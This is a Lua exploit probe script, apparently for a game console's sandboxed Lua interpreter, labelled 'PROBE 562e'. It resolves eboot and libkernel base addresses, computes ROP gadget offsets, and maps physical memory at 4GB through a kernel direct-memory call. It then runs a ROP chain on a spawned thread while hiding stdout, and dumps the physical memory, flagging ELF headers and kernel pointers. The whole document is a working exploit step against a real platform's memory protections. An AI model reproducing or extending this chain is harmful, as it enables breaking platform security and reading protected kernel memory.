-- CRASH_CLASS: MODERATE
-- PROBE 562e: Physical memory read with fd1 redirect during child thread
--
-- 562c/562d proved: each ROP gadget produces "77" binary on fd 1.
-- Fix: dup(1) to save stdout, close(1), do thread work,
-- dup2(saved,1) to restore. Child's "77" goes to /dev/null (closed fd).
--
-- Read phys 0x100000000 (4GB), print results cleanly.

print("=== PROBE 562e: PHYS READ (dup2 redirect) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do wd(buf + off, 0) end
end

local Z = uint64(0)
local sc6   = mk(6)    -- close
local sc20  = mk(20)   -- getpid
local sc41  = mk(41)   -- dup
local sc73  = mk(73)   -- munmap
local sc90  = mk(90)   -- dup2
local sc477 = mk(477)  -- mmap
local sc455 = mk(455)  -- thr_new
local sc593 = mk(593)  -- dynlib_get_info

local pid = N(sc20())
print("pid=" .. pid)

-- Eboot + libkernel
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", eb_hi, eb_lo, lk_hi, lk_lo))

-- Gadgets
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rax_ret     = eboot + uint64(0x992)
local mov_rax_mem_rsi = eboot + uint64(0x1A5CC4)
local mov_mem_rdi_rax = eboot + uint64(0x92C67)
local bare_ret        = eboot + uint64(0x42)

-- ============================================================
-- STEP 1: MapDM (BEFORE fd redirect — clean output)
-- ============================================================
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print(string.format("MapDM rv=%d", md_rv))
io.flush()

-- ============================================================
-- STEP 2: Build child ROP chain
-- ============================================================
local shared = memory.alloc(0x200)
zero(shared, 0x200)
local nq = 16

local ss = 0x4000
local ok_stk, sb = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)

local sb_n = N(sb)
local rsp_n = (sb_n + ss) - ((sb_n + ss) % 16) - 8
local rsp = sb + uint64(rsp_n - sb_n)

local ci = 0
local function wc(val) wq(rsp + uint64(ci * 8), val); ci = ci + 1 end

for qi = 0, nq - 1 do
    wc(pop_rsi_ret)
    wc(mapped_va + uint64(qi * 8))
    wc(mov_rax_mem_rsi)
    wc(pop_rdi_ret)
    wc(shared + uint64(8 + qi * 8))
    wc(mov_mem_rdi_rax)
end

wc(pop_rax_ret)
wc(uint64("0xDEADFACE"))
wc(pop_rdi_ret)
wc(shared)
wc(mov_mem_rdi_rax)

for i = 1, 32 do wc(bare_ret) end

local pa = memory.alloc(0x40)
zero(pa, 0x40)
wq(pa + 0x00, bare_ret)
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid_buf = memory.alloc(8)
wq(tid_buf, Z)
wq(pa + 0x30, uint64(tid_buf))

print(string.format("chain=%d gadgets", ci))
io.flush()

-- ============================================================
-- STEP 3: Redirect fd 1, spawn child, wait, restore fd 1
-- ============================================================

-- Save fd 1
local ok_dup, saved_fd = pcall(function() return sc41(uint64(1)) end)
local sfd = ok_dup and N(saved_fd) or -1
print(string.format("dup(1)=%d", sfd))
io.flush()

-- Close fd 1 (child's "77" output will get EBADF, silently dropped)
if sfd >= 0 then
    pcall(function() sc6(uint64(1)) end)
end

-- Spawn child
pcall(function() sc455(uint64(pa), uint64(0x38)) end)

-- Wait for sentinel
local sentinel = 0
for wait = 1, 5000 do
    for j = 1, 200 do local x = j * j end
    sentinel = rb(shared) or 0
    if sentinel == 0xDEADFACE then break end
end

-- Read results into table
local results = {}
for qi = 0, nq - 1 do
    local lo = rb(shared + 8 + qi * 8) or 0
    local hi = rb(shared + 8 + qi * 8 + 4) or 0
    results[qi] = {hi, lo}
end

-- Restore fd 1
if sfd >= 0 then
    pcall(function() sc90(uint64(sfd), uint64(1)) end)
    pcall(function() sc6(uint64(sfd)) end)
end

-- ============================================================
-- STEP 4: Print results (fd 1 restored, clean output)
-- ============================================================
print("")
print("========================================")

if sentinel == 0xDEADFACE then
    print("PHYSICAL MEMORY READ SUCCESS!")
    print("phys=0x100000000 (4GB)")
    for qi = 0, nq - 1 do
        local q = results[qi]
        if q then
            local tag = ""
            if qi == 0 and q[2] == 0x464C457F then tag = " *** ELF! ***" end
            if q[1] >= 0xFFFF8000 then tag = tag .. " KPTR?" end
            print(string.format("  [+%02X] %08X_%08X%s", qi*8, q[1], q[2], tag))
        end
    end
else
    print(string.format("TIMEOUT sentinel=0x%X", sentinel))
end

-- Cleanup
pcall(function() sc73(mapped_va, uint64(0x4000)) end)
pcall(function() sc73(sb, uint64(ss)) end)

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 562e DONE ===")
